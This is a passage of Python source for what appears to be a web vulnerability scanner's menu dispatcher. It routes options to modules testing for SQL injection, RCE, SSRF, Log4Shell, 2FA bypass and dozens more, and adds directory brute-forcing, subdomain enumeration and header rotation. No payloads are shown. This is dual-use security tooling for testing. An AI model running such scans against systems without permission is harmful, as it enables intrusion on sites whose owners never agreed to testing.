                    include_massassign='37' in chosen,     include_bopla='38' in chosen,
                    include_api_ver='39' in chosen,        include_cache='40' in chosen,
                    include_ws='41' in chosen,             include_path_trav='42' in chosen,
                    include_verb='43' in chosen,           include_jwt_conf='44' in chosen,
                    include_shellshock='45' in chosen,     include_log4shell='46' in chosen,
                    include_spring='47' in chosen,
                )
                beep(2)
                cli.display_multiple_results(results)
                rd, rp = FileHandler.auto_save(results)
                cli.console.print(f"[green]✔ JSON   → {rd}[/green]")
                cli.console.print(f"[green]✔ Reports→ {rp}[/green]")
            except ValueError as e:
                cli.console.print(f"[red]{e}[/red]")

        # ── Injection ─────────────────────────────────────────────────────────
        elif mode == '3':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=True, include_xss=False)
                run_scan(_r)

        elif mode == '4':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=True)
                run_scan(_r)

        elif mode == '5':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_rce=True)
                run_scan(_r)

        elif mode == '6':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_lfi=True)
                run_scan(_r)

        elif mode == '7':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_rfi=True)
                run_scan(_r)

        elif mode == '8':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_xxe=True)
                run_scan(_r)

        elif mode == '9':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_crlf=True)
                run_scan(_r)

        # ── Access Control ────────────────────────────────────────────────────
        elif mode == '10':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_idor=True)
                run_scan(_r)

        elif mode == '11':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_csrf=True)
                run_scan(_r)

        elif mode == '12':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_jwt=True)
                run_scan(_r)

        elif mode == '13':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_bizlogic=True)
                run_scan(_r)

        elif mode == '14':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_enum=True)
                run_scan(_r)

        elif mode == '15':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_mfa=True)
                run_scan(_r)

        # ── Server-Side ───────────────────────────────────────────────────────
        elif mode == '16':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_ssrf=True)
                run_scan(_r)

        elif mode == '17':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_openredirect=True)
                run_scan(_r)

        elif mode == '18':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_hostheader=True)
                run_scan(_r)

        elif mode == '19':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_prototype=True)
                run_scan(_r)

        elif mode == '20':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_deserial=True)
                run_scan(_r)

        elif mode == '21':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_race=True)
                run_scan(_r)

        elif mode == '22':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_smuggling=True)
                run_scan(_r)

        # ── Misconfiguration ──────────────────────────────────────────────────
        elif mode == '23':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_secmisconf=True)
                run_scan(_r)

        elif mode == '24':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_dirlist=True)
                run_scan(_r)

        elif mode == '25':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_cors=True)
                run_scan(_r)

        elif mode == '26':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_clickjacking=True)
                run_scan(_r)

        elif mode == '27':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_fileupload=True)
                run_scan(_r)

        elif mode == '28':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            cli.console.print("[dim]Checking common subdomains — may take a minute...[/dim]")
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_sdt=True)
                run_scan(_r)

        elif mode == '29':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_graphql=True)
                run_scan(_r)

        elif mode == '30':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_sensitive=True)
                run_scan(_r)

        elif mode == '31':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_hpp=True)
                run_scan(_r)

        # ── External ──────────────────────────────────────────────────────────
        elif mode == '32':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=True, include_sqli=False, include_xss=False)
                run_scan(_r)

        # ── Combo Scans ───────────────────────────────────────────────────────
        elif mode == 'A':
            url = cli.get_single_url()
            if not await check_target(url): continue
            cli.console.print("\n[bold yellow]⚔ Injection Suite — SQLi, XSS/SSTI, RCE, LFI, RFI, XXE, CRLF[/bold yellow]\n")
            run_scan(await scanner.comprehensive_scan(
                url, include_vt=False,
                include_sqli=True,  include_xss=True,  include_rce=True,
                include_lfi=True,   include_rfi=True,  include_xxe=True,
                include_crlf=True,
            ))

        elif mode == 'B':
            url = cli.get_single_url()
            if not await check_target(url): continue
            cli.console.print("\n[bold yellow]🔓 Access Control Suite — IDOR, CSRF, JWT, BizLogic, Enum, 2FA[/bold yellow]\n")
            run_scan(await scanner.comprehensive_scan(
                url, include_vt=False, include_sqli=False, include_xss=False,
                include_idor=True,    include_csrf=True,     include_jwt=True,
                include_bizlogic=True, include_enum=True,    include_mfa=True,
            ))

        elif mode == 'C':
            url = cli.get_single_url()
            if not await check_target(url): continue
            cli.console.print("\n[bold yellow]🔁 Server-Side Suite — SSRF, Redirect, HostHdr, Prototype, Deserial, Race, Smuggling[/bold yellow]\n")
            run_scan(await scanner.comprehensive_scan(
                url, include_vt=False, include_sqli=False, include_xss=False,
                include_ssrf=True,        include_openredirect=True,
                include_hostheader=True,  include_prototype=True,
                include_deserial=True,    include_race=True,
                include_smuggling=True,
            ))

        elif mode == 'D':
            url = cli.get_single_url()
            if not await check_target(url): continue
            cli.console.print("\n[bold yellow]⚙ Misconfiguration Suite — SecMisconf, DirList, CORS, Clickjack, Upload, SDT, GraphQL, Sensitive, HPP[/bold yellow]\n")
            run_scan(await scanner.comprehensive_scan(
                url, include_vt=False, include_sqli=False, include_xss=False,
                include_secmisconf=True,  include_dirlist=True,
                include_cors=True,        include_clickjacking=True,
                include_fileupload=True,  include_sdt=True,
                include_graphql=True,     include_sensitive=True,
                include_hpp=True,
            ))

        # ── Full Scan ─────────────────────────────────────────────────────────
        elif mode == '99':
            url = cli.get_single_url()
            if not await check_target(url):
                continue
            cli.console.print("\n[bold cyan]Starting Full Scan — All modules (progressive output)...[/bold cyan]\n")
            scan_urls_99 = await get_scan_urls(url)

            def _print_module(label: str, emoji: str, vulns, color: str = "red"):
                if not vulns:
                    return
                tree = Tree(f"[{color}]{emoji} {label}: {len(vulns)} found[/{color}]")
                for i, v in enumerate(vulns, 1):
                    sc = {"CRITICAL":"bold red","HIGH":"red","MEDIUM":"yellow","LOW":"dim"}.get(v.severity,"white")
                    node = tree.add(f"[bold]#{i}[/bold] [{sc}][{v.severity}] {v.subtype or v.vulnerability_type.value}[/{sc}]")
                    node.add(f"[dim]URL      : {v.url}[/dim]")
                    node.add(f"[dim]Param    : {', '.join(v.vulnerable_params)}[/dim]")
                    if v.evidence:
                        node.add(f"[dim]Evidence : {v.evidence}[/dim]")
                    if v.payload_used:
                        node.add(f"[yellow]PoC      : {v.payload_used}[/yellow]")
                    if v.impact:
                        node.add(f"[dim]Impact   : {v.impact}[/dim]")
                cli.console.print(f"[dim]── {label} ──────────────────────────────[/dim]")
                cli.console.print(tree)
                cli.console.print()

            async with httpx.AsyncClient(headers=random_headers(), verify=False) as _client:
              for _su99 in scan_urls_99:
                result = ComprehensiveScanResult(url=_su99, timestamp=datetime.now().isoformat())
                rotate_device()
                if len(scan_urls_99) > 1:
                    cli.console.print(f"\n[bold dim]═══ Scanning: {_su99[:70]} ═══[/bold dim]")

                if scanner.vt_api.enabled:
                    with cli.console.status("[dim]🔎 VirusTotal...[/dim]", spinner="dots"):
                        result.virustotal = await scanner.vt_api.scan_url(_client, url)
                    vt = result.virustotal
                    if vt and not vt.error:
                        vc = cli._get_verdict_color(vt.verdict)
                        cli.console.print(f"[dim]── VirusTotal ──────────────────────────────[/dim]")
                        cli.console.print(f"[{vc}]🔎 VirusTotal: {vt.verdict.value} ({vt.malicious} malicious / {vt.total_engines} engines)[/{vc}]")
                        cli.console.print()

                _modules = [
                    ("SQL Injection",           "💉", "red",      scanner.sqli_scanner,         "sqli_vulnerabilities"),
                    ("XSS / SSTI",              "⚡", "red",      scanner.xss_scanner,          "xss_vulnerabilities"),
                    ("RCE",                     "💀", "bold red", scanner.rce_scanner,          "rce_vulnerabilities"),
                    ("LFI",                     "📂", "red",      scanner.lfi_scanner,          "lfi_vulnerabilities"),
                    ("RFI",                     "🌐", "red",      scanner.rfi_scanner,          "rfi_vulnerabilities"),
                    ("XXE Injection",           "📄", "bold red", scanner.xxe_scanner,          "xxe_vulnerabilities"),
                    ("CRLF Injection",          "↵",  "red",      scanner.crlf_scanner,         "crlf_vulnerabilities"),
                    ("IDOR",                    "🔓", "red",      scanner.idor_scanner,         "idor_vulnerabilities"),
                    ("CSRF",                    "🛡", "yellow",   scanner.csrf_scanner,         "csrf_vulnerabilities"),
                    ("JWT Vulnerability",       "🔑", "bold red", scanner.jwt_scanner,          "jwt_vulnerabilities"),
                    ("Business Logic",          "💼", "yellow",   scanner.bizlogic_scanner,     "bizlogic_vulnerabilities"),
                    ("SSRF",                    "🔁", "red",      scanner.ssrf_scanner,         "ssrf_vulnerabilities"),
                    ("Open Redirect",           "↪",  "yellow",   scanner.openredirect_scanner, "openredirect_vulnerabilities"),
                    ("Host Header",             "🏠", "red",      scanner.hostheader_scanner,   "hostheader_vulnerabilities"),
                    ("Prototype Pollution",     "⚗",  "red",      scanner.prototype_scanner,    "prototype_vulnerabilities"),
                    ("Insecure Deserialization","📦", "bold red", scanner.deserial_scanner,     "deserial_vulnerabilities"),
                    ("Race Condition",          "⚡", "red",      scanner.race_scanner,         "race_vulnerabilities"),
                    ("Security Misconfig",      "⚙",  "yellow",   scanner.secmisconf_scanner,   "secmisconf_vulnerabilities"),
                    ("Directory Listing",       "📁", "yellow",   scanner.dirlist_scanner,      "dirlist_vulnerabilities"),
                    ("CORS",                    "🌉", "yellow",   scanner.cors_scanner,         "cors_vulnerabilities"),
                    ("Clickjacking",            "🖱",  "yellow",   scanner.clickjacking_scanner, "clickjacking_vulnerabilities"),
                    ("File Upload",             "📤", "red",      scanner.fileupload_scanner,   "fileupload_vulnerabilities"),
                    ("Subdomain Takeover",      "🌍", "magenta",  scanner.sdt_scanner,          "sdt_vulnerabilities"),
                    ("GraphQL",                 "📡", "yellow",   scanner.graphql_scanner,      "graphql_vulnerabilities"),
                    ("Sensitive Data",          "🔐", "bold red", scanner.sensitive_scanner,    "sensitive_vulnerabilities"),
                    ("HTTP Param Pollution",    "🔀", "yellow",   scanner.hpp_scanner,          "hpp_vulnerabilities"),
                    ("Account Enumeration",     "👤", "yellow",   scanner.enum_scanner,         "enum_vulnerabilities"),
                    ("2FA/OTP Bypass",          "🔓", "red",      scanner.mfa_scanner,          "mfa_vulnerabilities"),
                    ("HTTP Smuggling",          "🚇", "bold red", scanner.smuggling_scanner,    "smuggling_vulnerabilities"),
                    ("SSTI",                    "🧩", "bold red", scanner.ssti_scanner,         "ssti_vulns"),
                    ("NoSQL Injection",         "🍃", "bold red", scanner.nosqli_scanner,       "nosqli_vulns"),
                    ("Mass Assignment",         "📝", "yellow",   scanner.massassign_scanner,   "massassign_vulns"),
                    ("JWT Confusion",           "🔑", "bold red", scanner.jwt_conf_scanner,     "jwt_conf_vulns"),
                    ("Cache Poisoning",         "🗄", "red",      scanner.cache_scanner,        "cache_vulns"),
                    ("WebSocket Injection",     "🔌", "yellow",   scanner.ws_scanner,           "websocket_vulns"),
                    ("Path Traversal",          "📁", "red",      scanner.path_trav_scanner,    "path_trav_vulns"),
                    ("API Versioning Abuse",    "🔢", "yellow",   scanner.api_ver_scanner,      "api_abuse_vulns"),
                    ("BOPLA",                   "🏠", "yellow",   scanner.bopla_scanner,        "bopla_vulns"),
                    ("LDAP Injection",          "📋", "red",      scanner.ldap_scanner,         "ldap_vulns"),
                    ("XML Injection",           "📄", "yellow",   scanner.xml_scanner,          "xml_vulns"),
                    ("Verb Tampering",          "🔧", "yellow",   scanner.verb_scanner,         "verb_vulns"),
                    ("Shellshock",              "💥", "bold red", scanner.shellshock_scanner,   "shellshock_vulns"),
                    ("Log4Shell",               "☠",  "bold red", scanner.log4shell_scanner,    "log4shell_vulns"),
                    ("Spring4Shell",            "🌱", "bold red", scanner.spring_scanner,       "spring_vulns"),
                    ("SSI Injection",           "📎", "red",      scanner.ssi_scanner,          "ssi_vulns"),
                    ("CSTI",                    "🌐", "red",      scanner.csti_scanner,         "csti_vulns"),
                ]

                for label, emoji, color, sc, attr in _modules:
                    rotate_device()
                    try:
                        with cli.console.status(f"[dim]{emoji} {label}...[/dim]", spinner="dots"):
                            vulns = await sc.scan_url(_client, url)
                        setattr(result, attr, vulns)
                        _print_module(label, emoji, vulns, color)
                    except Exception:
                        setattr(result, attr, [])

            result.overall_verdict = scanner._determine_overall_verdict(result)
            beep(2)

            vc = cli._get_verdict_color(result.overall_verdict)
            cli.console.print("=" * 60)
            cli.console.print(f"[{vc}]  ⚑ OVERALL VERDICT: {result.overall_verdict.value}[/{vc}]")
            cli.console.print(f"[dim]  Completed at: {result.timestamp}[/dim]")
            cli.console.print("=" * 60)

            rd, rp = FileHandler.auto_save([result])
            cli.console.print(f"\n[green]✔ JSON   → {rd}[/green]")
            cli.console.print(f"[green]✔ Report → {rp}[/green]")


        elif mode == '33':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_ssti=True)
                run_scan(_r)

        elif mode == '34':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_nosqli=True)
                run_scan(_r)

        elif mode == '35':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_ldap=True)
                run_scan(_r)

        elif mode == '36':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_xml=True)
                run_scan(_r)

        elif mode == '37':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_ssi=True)
                run_scan(_r)

        elif mode == '38':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_csti=True)
                run_scan(_r)

        elif mode == '39':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_massassign=True)
                run_scan(_r)

        elif mode == '40':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_bopla=True)
                run_scan(_r)

        elif mode == '41':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_api_ver=True)
                run_scan(_r)

        elif mode == '42':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_cache=True)
                run_scan(_r)

        elif mode == '43':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_ws=True)
                run_scan(_r)

        elif mode == '44':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_path_trav=True)
                run_scan(_r)

        elif mode == '45':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_verb=True)
                run_scan(_r)

        elif mode == '46':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_jwt_conf=True)
                run_scan(_r)

        elif mode == '47':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_shellshock=True)
                run_scan(_r)

        elif mode == '48':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_log4shell=True)
                run_scan(_r)

        elif mode == '49':
            url = cli.get_single_url()
            if not await check_target(url): continue
            for _su in (await get_scan_urls(url)):
                with cli.console.status(f'[cyan]⟳ {_su[:65]}[/cyan]', spinner='dots'):
                    _r = await scanner.comprehensive_scan(_su, include_vt=False, include_sqli=False, include_xss=False, include_spring=True)
                run_scan(_r)

        elif mode == 'E':
            url = cli.get_single_url()
            if not await check_target(url): continue
            cli.console.print("\n[bold yellow]⚔ New Injection Suite — SSTI · NoSQLi · LDAP · XML · SSI · CSTI[/bold yellow]\n")
            run_scan(await scanner.comprehensive_scan(
                url, include_vt=False, include_sqli=False, include_xss=False,
                include_ssti=True, include_nosqli=True, include_ldap=True,
                include_xml=True,  include_ssi=True,   include_csti=True,
            ))

        elif mode == 'F':
            url = cli.get_single_url()
            if not await check_target(url): continue
            cli.console.print("\n[bold yellow]☠ CVE Suite — MassAssign · BOPLA · API · Cache · WS · PathTrav · Verb · JWT · Shellshock · Log4Shell · Spring4Shell[/bold yellow]\n")
            run_scan(await scanner.comprehensive_scan(
                url, include_vt=False, include_sqli=False, include_xss=False,
                include_massassign=True, include_bopla=True,    include_api_ver=True,
                include_cache=True,      include_ws=True,        include_path_trav=True,
                include_verb=True,       include_jwt_conf=True,  include_shellshock=True,
                include_log4shell=True,  include_spring=True,
            ))

        # ── Tools ─────────────────────────────────────────────────────────────
        elif mode == '50':
            show_settings()
            continue  # Skip the separator line

        elif mode == '51':
            url = cli.get_single_url()
            cli.console.print("\n[cyan]Detecting WAF...[/cyan]")
            waf = await waf_detector.detect(url)
            if waf["detected"]:
                cli.console.print(f"[red]⚠ WAF Detected: {waf['waf'] or 'Unknown'} (confidence: {waf['confidence']})[/red]")
                cli.console.print(f"[dim]{waf['details']}[/dim]")
            else:
                cli.console.print("[green]✔ No WAF detected (or unrecognized)[/green]")

        elif mode == '52':
            url = cli.get_single_url()
            if not await check_target(url): continue
            ext = input("Test file extensions? (y/n, default y): ").strip().lower()
            results_52 = await dir_bruter.brute(url, cli.console, extensions=(ext != 'n'))
            if results_52:
                tree_52 = Tree(f"[cyan]📂 Directory Brute — {len(results_52)} found[/cyan]")
                for r in results_52:
                    sc = {200:"green",301:"cyan",302:"cyan",403:"yellow",401:"yellow",500:"red"}.get(r["status"],"dim")
                    n  = tree_52.add(f"[{sc}]{r['status']}[/{sc}]  {r['path']}  [dim]({r['size']}B)[/dim]")
                    if r["redirect"]:
                        n.add(f"[dim]→ {r['redirect']}[/dim]")
                cli.console.print(tree_52)
                # Save to file
                rd, _ = FileHandler.get_output_dirs()
                domain = FileHandler.domain_from_url(url)
                out_f  = rd / f"{domain}_dirbust_{datetime.now().strftime('%H%M%S')}.txt"
                with open(out_f, 'w') as f:
                    for r in results_52:
                        f.write(f"{r['status']}  {r['path']}  {r['size']}B  {r.get('redirect','')}\n")
                cli.console.print(f"[green]✔ Saved → {out_f}[/green]")
            else:
                cli.console.print("[dim]No interesting paths found.[/dim]")

        elif mode == '53':
            url = cli.get_single_url()
            parsed_53 = urllib.parse.urlparse(url)
            domain_53 = parsed_53.netloc.split(':')[0]
            cli.console.print(f"\n[cyan]Enumerating subdomains of {domain_53}...[/cyan]")
            subs = await subdomain_enum.enumerate(domain_53)
            if subs:
                tree_53 = Tree(f"[cyan]🌐 Subdomains — {len(subs)} found[/cyan]")
                for s in subs:
                    sc = {200:"green"}.get(s["status"],"dim") if s["status"] else "yellow"
                    label = f"[{sc}]{s['subdomain']}[/{sc}]  [dim]{s['ip']}  HTTP {s['status']}[/dim]"
                    n = tree_53.add(label)
                    if s["title"]:
                        n.add(f"[dim]{s['title']}[/dim]")
                cli.console.print(tree_53)
                rd, _ = FileHandler.get_output_dirs()
                out_f = rd / f"{domain_53}_subdomains_{datetime.now().strftime('%H%M%S')}.txt"
                with open(out_f, 'w') as f:
                    for s in subs:
                        f.write(f"{s['subdomain']}\t{s['ip']}\t{s['status']}\t{s['title']}\n")
                cli.console.print(f"[green]✔ Saved → {out_f}[/green]")
            else:
                cli.console.print("[dim]No subdomains found.[/dim]")

        elif mode == '54':
            url = cli.get_single_url()
            if not await check_target(url): continue
            cli.console.print("\n[cyan]Discovering parameters...[/cyan]")
            found_54 = await param_discovery.discover(url, cli.console)
            if found_54:
                cli.console.print(f"[green]Discovered params: {', '.join(found_54)}[/green]")
                # Build a test URL with found params
                sep = '&' if '?' in url else '?'
                test_url = url + sep + '&'.join(f"{p}=test" for p in found_54[:10])
                cli.console.print(f"[dim]Test URL: {test_url}[/dim]")

        elif mode == '55':
            url = cli.get_single_url()
            if not await check_target(url): continue
            cli.console.print("\n[bold yellow]Auth Scanner — only use on systems you own or have permission to test.[/bold yellow]")
